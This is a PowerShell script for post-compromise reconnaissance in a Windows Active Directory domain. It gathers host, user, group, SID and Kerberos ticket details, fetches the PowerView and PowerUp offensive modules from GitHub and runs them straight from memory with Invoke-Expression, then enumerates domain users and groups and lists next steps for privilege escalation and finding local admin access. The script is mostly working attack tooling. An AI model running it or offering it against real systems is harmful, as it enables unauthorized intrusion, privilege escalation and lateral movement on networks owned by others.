## Computer information
$computerName = $env:COMPUTERNAME
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike 'Loopback' -and $_.IPAddress -notlike '169.*'}).IPAddress
#$localIP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -like 'Wi-Fi'}).IPAddress
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainController = $domain.DomainControllers[0].Name
$logonserver=$Env:LOGONSERVER

## User information
$windowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$userName = $windowsIdentity.Name
$sid = $windowsIdentity.User.Value
$groups = $windowsIdentity.Groups | ForEach-Object {$_.Translate([System.Security.Principal.NTAccount]).Value}

<#
## Privileges
$privilegeType = [System.Enum]::GetValues([System.Security.AccessControl.PrivilegeType])
$privileges = $privilegeType | ForEach-Object {
    $privilege = $null
    try {
        $privilege = New-Object System.Security.AccessControl.Privilege($_)
        $isEnabled = $privilege.EnablePrivilege()
        if ($isEnabled) {
            $_.ToString()
        }
    } catch {
        Write-Host "Failed to check privilege: $_"
    } finally {
        if ($privilege -ne $null) {
            $privilege.RevertPrivilege()
        }
    }
}

## Kerberos tickets
$tickets = $windowsIdentity.Tickets | ForEach-Object {
    $ticket = $_
    $ticketInfo = @{
        "Server" = $ticket.ServerName
        "Start Time" = $ticket.StartTime
        "End Time" = $ticket.EndTime
    }
    New-Object -TypeName PSObject -Property $ticketInfo
}
#>

<#
Write-Host "`n"
Write-Host "Privileges:`n$($privileges -join "`n")"

Write-Host "`n"
Write-Host "## Kerberos tickets"
$tickets | Format-Table -AutoSize
#>



Write-Host "`n"
Write-Host "## Computer information"
Write-Host "Hostname: $computerName"
Write-Host "Local IP address: $localIP"
Write-Host "Domain: $domain"
Write-Host "Domain Controller: $domainController"
Write-Host "Logged on from: $logonserver"

Write-Host "`n"
Write-Host "## User information"
Write-Host "Current user: $userName"
Write-Host "SID: $sid"
Write-Host "`n"
Write-Host "Groups:`n$($groups -join "`n")"

Write-Host "`n"
Write-Host "## Kerberos tickets"
klist

Write-Host "`n"
Write-Host "Importing powerview and powerup modules"
## Import powerview and powerup modules

## Check for PowerView module and download if missing
if (-not (Get-Help Get-DomainUser)) {
    Write-Output "PowerView module not found, downloading into memory..."
    try {
      $pwContent = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
      Invoke-Expression $pwContent
      Write-Output "PowerView loaded successfully"
     } catch {
     Write-Output "Could not download PowerView: $($_.Exception.Message)"
   }
   } else {
    Write-Output "PowerView already here!"
   }

## Check for PowerUp module and download if missing
if (-not (Get-Help Invoke-AllChecks)) {
    Write-Output "PowerUp module not found, downloading into memory..."
    try {
      $pwContent = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1')
      Invoke-Expression $pwContent
      Write-Output "PowerUp loaded successfully"
     } catch {
     Write-Output "Could not download PowerUp: $($_.Exception.Message)"
   }
   } else {
    Write-Output "PowerUp already here!"
   }

Write-Host "`n"
Write-Host "Getting Domain User and Group info from Powerview..."

$identity = $env:USERNAME

Write-Host "`n"
Write-Host "## Domain User information:"
# Run Get-DomainUser command
Get-DomainUser -Identity $identity #| select name,description,distinguishedname,memberof,lastloggedon,timesloggedon,

Write-Host "`n"
Write-Host "## Domain Group information:"
# Run Get-DomainGroup command
Get-DomainGroup -UserName "$identity" | select name,description,distinguishedname,memberof


Write-Host "`n"
Write-Host "[!] You now probably want to run:"
Write-Host "[*] Invoke-AllChecks"
Write-Host "[*] Get-ModifiableService(File) | select servicename, abusefeature"
Write-Host "[*] Find-LocalAdminAccess -CheckAccess"

Write-Host "`n"
Write-Host "[*] Remember to re-run bloodhound or enum after every new user/machine access!"



<#
# DOWNLOAD SCRIPTS TO DISK AND IMPORT AS MODULES#
Write-Host "`n"
Write-Host "Importing powerview and powerup modules"
## Import powerview and powerup modules

## Check for PowerView module and download if missing
if (-not (Get-Module -Name PowerView -ListAvailable)) {
    Write-Output "PowerView module not found, downloading to current directory..."
    try {
        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
        Write-Output "PowerView downloaded successfully"
    } catch {
        Write-Output "Could not download PowerView: $($_.Exception.Message)"
    }
} else {
    Write-Output "PowerView module found"
}

## Check for PowerUp module and download if missing
if (-not (Get-Module -Name PowerUp -ListAvailable)) {
    Write-Output "PowerUp module not found, downloading to current directory..."
    try {
        $puContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1' -UseBasicParsing
        $puContent.Content | Out-File -FilePath ".\PowerUp.ps1"
        Write-Output "PowerUp downloaded successfully"
    } catch {
        Write-Output "Could not download PowerUp: $($_.Exception.Message)"
    }
} else {
    Write-Output "PowerUp module found"
}

## Import PowerView script if available
if (Test-Path ".\PowerView.ps1") {
    try {
        Write-Output "Importing PowerView module..."
        . ".\PowerView.ps1"
        Write-Output "PowerView imported successfully"
        }
        catch {
        Write-Output "Could not IMPORT PowerView: $($_.Exception.Message)"
    }
        }
        
        

## Import PowerUp script if available
if (Test-Path ".\PowerUp.ps1") {
    try {
        Write-Output "Importing PowerUp module..."
        . ".\PowerUp.ps1"
        Write-Output "PowerUp imported successfully"
        }
        catch {
        Write-Output "Could not IMPORT PowerUp: $($_.Exception.Message)"
    }
        }
#>

